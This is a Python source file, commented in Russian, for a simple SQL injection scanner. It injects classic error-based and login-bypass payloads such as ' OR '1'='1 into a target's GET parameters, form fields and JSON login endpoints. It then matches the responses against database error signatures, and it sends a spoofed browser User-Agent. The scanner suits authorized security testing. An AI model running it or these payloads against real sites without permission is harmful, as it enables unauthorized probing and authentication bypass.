"""
SQL Injection Scanner: Error-based, Auth Bypass, GET/POST параметры.
Корректная подстановка payload в значение параметра, обработка connection errors.
"""
import requests
import time
from urllib.parse import urlparse, parse_qs, urlencode

# Payloads: Error-based и Auth Bypass (без Time-based — долго и ненадёжно по умолчанию)
PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "1' OR '1'='1",
    "1 OR 1=1",
]

# Сигнатуры ошибок БД
DBMS_ERRORS = [
    "SQL syntax",
    "mysql_fetch",
    "MySQL",
    "check the manual that corresponds to your MySQL",
    "PostgreSQL query failed",
    "unterminated quoted string",
    "syntax error at or near",
    "ORA-01756",
    "ORA-00936",
    "SQL command not properly ended",
    "Unclosed quotation mark",
    "ODBC SQL Server Driver",
    "SQLite Error",
    "sqlite3.OperationalError",
    "near \"'\": syntax error",
]

# Параметры по умолчанию, если в URL нет query (ограничено для скорости)
DEFAULT_PARAMS = {"id": "1", "cat": "1", "page": "1"}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Accept": "text/html,application/xhtml+xml",
}


def _inject_param(base_url: str, param: str, value: str, payload: str) -> str:
    """Подставить payload в значение параметра и собрать URL."""
    parsed = urlparse(base_url)
    base = f"{parsed.scheme or 'http'}://{parsed.netloc or ''}{parsed.path or '/'}"
    existing = parse_qs(parsed.query, keep_blank_values=True) if parsed.query else {}
    existing[param] = [str(value) + payload]
    query = urlencode(existing, doseq=True)
    return f"{base}?{query}"


def _get_params_to_test(url: str) -> dict:
    """Извлечь параметры из URL или вернуть дефолтные."""
    parsed = urlparse(url)
    if parsed.query:
        params = parse_qs(parsed.query, keep_blank_values=True)
        return {k: v[0] for k, v in params.items()}
    return dict(DEFAULT_PARAMS)


def _has_sql_error(text: str) -> bool:
    """Проверка ответа на признаки SQL-ошибки."""
    if not text:
        return False
    lower = text.lower()
    return any(err.lower() in lower for err in DBMS_ERRORS)


def scan_sql_injection(url: str, timeout: int = 5) -> bool:
    """
    Сканирование на SQL Injection: GET, POST (form), JSON API.
    Корректная инъекция в параметры, обработка connection errors.
    """
    print(f"🔍 SQLi scan: {url}")
    try:
        # 1. Проверка базового запроса
        try:
            baseline = requests.get(url, headers=HEADERS, timeout=timeout)
        except requests.RequestException as e:
            print(f"  ⚠️ Connection error: {e}")
            return False

        params = _get_params_to_test(url)
        params = dict(list(params.items())[:8])  # не более 8 параметров

        # 2. GET: инъекция в каждый параметр
        for param, orig_value in params.items():
            for payload in PAYLOADS[:5]:  # топ-5 payloads для скорости
                try:
                    test_url = _inject_param(url, param, orig_value, payload)
                    r = requests.get(test_url, headers=HEADERS, timeout=timeout)
                    if _has_sql_error(r.text):
                        print(f"  🔴 HIT: Error-based SQLi via GET param '{param}'")
                        return True
                except requests.Timeout:
                    continue
                except requests.RequestException:
                    continue

        # 3. POST (form) для URL с поиском/формами
        base = url.split("?")[0] or url
        for param in list(params.keys())[:5]:  # ограничить число
            for payload in PAYLOADS[:4]:
                try:
                    data = {p: (params[p] + payload if p == param else params[p]) for p in params}
                    r = requests.post(base, data=data, headers=HEADERS, timeout=timeout)
                    if _has_sql_error(r.text):
                        print(f"  🔴 HIT: Error-based SQLi via POST param '{param}'")
                        return True
                except requests.RequestException:
                    continue

        # 4. JSON API (login и т.п.)
        for endpoint in ["/rest/user/login", "/api/login", "/login"]:
            api_url = base.rstrip("/") + endpoint
            try:
                for payload in PAYLOADS[:3]:
                    try:
                        r = requests.post(
                            api_url,
                            json={"email": payload, "password": "x", "username": payload},
                            headers=HEADERS,
                            timeout=timeout,
                        )
                        if _has_sql_error(r.text):
                            print(f"  🔴 HIT: SQLi in JSON API {endpoint}")
                            return True
                    except requests.RequestException:
                        continue
            except Exception:
                pass

        print("🟢 SQL Injection clean")
        return False

    except Exception as e:
        print(f"  ⚠️ SQLi scan error: {e}")
        return False
